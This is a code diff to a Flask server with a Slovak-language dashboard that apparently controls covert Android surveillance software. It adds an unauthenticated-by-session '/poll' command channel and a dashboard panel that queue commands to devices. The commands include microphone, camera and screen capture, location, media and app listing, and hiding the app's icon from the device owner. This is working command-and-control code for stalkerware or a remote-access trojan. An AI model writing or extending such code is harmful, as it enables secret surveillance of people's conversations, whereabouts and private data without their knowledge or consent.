@@ -49,7 +49,7 @@ def guard():
         return
     if request.path.startswith("/ingest") or request.path.startswith("/upload"):
         return
-    if request.path.startswith("/apk"):
+    if request.path.startswith("/apk") or request.path.startswith("/poll"):
         return
     if not authed():
         if request.path.startswith("/api/"):
@@ -182,6 +182,33 @@ def upload():
     return jsonify({"ok": True, "path": dest}), 200
 
 
+@app.route("/poll")
+def poll():
+    """Command channel for the device. The agent polls this endpoint and
+    executes the queued commands."""
+    device_id = request.args.get("device_id", "")
+    key = request.args.get("k", "")
+    if not _key_ok(key):
+        return jsonify({"error": "bad key"}), 403
+    if not device_id:
+        return jsonify({"error": "missing device_id"}), 400
+    models.touch_device(device_id)
+    return jsonify(models.fetch_commands(device_id))
+
+
+@app.route("/api/command", methods=["POST"])
+def api_command():
+    """Queues a command for a device (dashboard -> agent)."""
+    data = request.get_json(silent=True) or request.form
+    device_id = (data.get("device_id") or "").strip()
+    cmd = (data.get("cmd") or "").strip()
+    args = data.get("args") or {}
+    if not device_id or not cmd:
+        return jsonify({"error": "device_id and cmd are required"}), 400
+    models.insert_command(device_id, cmd, json.dumps(args))
+    return jsonify({"ok": True})
+
+
 @app.route("/api/devices")
 def api_devices():
     return jsonify(models.list_devices())
@@ -289,6 +316,23 @@ border-radius:6px;cursor:pointer;font-size:12px;text-decoration:none}
 </div>
 <div class="main">
 <div class="card"><h2>Mapa polôh</h2><div id="map"></div></div>
+<div class="card"><h2>Príkazy</h2>
+<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
+<select id="cmd" style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;
+border-radius:6px;padding:6px;font-size:12px">
+<option value="ping">ping</option><option value="loc">loc</option>
+<option value="mic">mic</option><option value="media">media</option>
+<option value="screen">screen</option><option value="cam">cam</option>
+<option value="usage">usage</option><option value="apps">apps</option>
+<option value="ddr">ddr</option><option value="flush">flush</option>
+<option value="hide">hide (skryje ikonu)</option><option value="show">show (zobrazí ikonu)</option>
+<option value="cfg">cfg</option>
+</select>
+<input id="args" placeholder="args (JSON, voliteľné)" style="flex:1;min-width:160px;
+background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;padding:6px;font-size:12px">
+<button class="btn" onclick="sendCmd()">Poslať</button>
+<span id="cmdr" style="font-size:12px;color:#6e7681"></span>
+</div></div>
 <div class="card"><h2>Logy</h2><table>
 <thead><tr><th style="width:70px">Čas</th><th style="width:70px">Typ</th><th>Obsah</th></tr></thead>
 <tbody id="logs"></tbody></table></div>
@@ -335,6 +379,19 @@ async function drawMap(){
   }
 }
 function pick(id){ sel = id; refresh(); }
+async function sendCmd(){
+  const el = document.getElementById('cmdr');
+  if(!sel){ el.textContent = 'Najprv vyber zariadenie'; el.style.color='#f85149'; return; }
+  let args = {};
+  const raw = document.getElementById('args').value.trim();
+  if(raw){ try { args = JSON.parse(raw); } catch(e){ el.textContent = 'Neplatný JSON'; el.style.color='#f85149'; return; } }
+  const r = await fetch('/api/command', {method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device_id: sel, cmd: document.getElementById('cmd').value, args})});
+  const d = await r.json();
+  el.textContent = d.ok ? ('Odoslané: ' + d.cmd) : (d.error || 'Chyba');
+  el.style.color = d.ok ? '#3fb950' : '#f85149';
+}
 setInterval(refresh, 15000);
 refresh();
 </script></body></html>"""
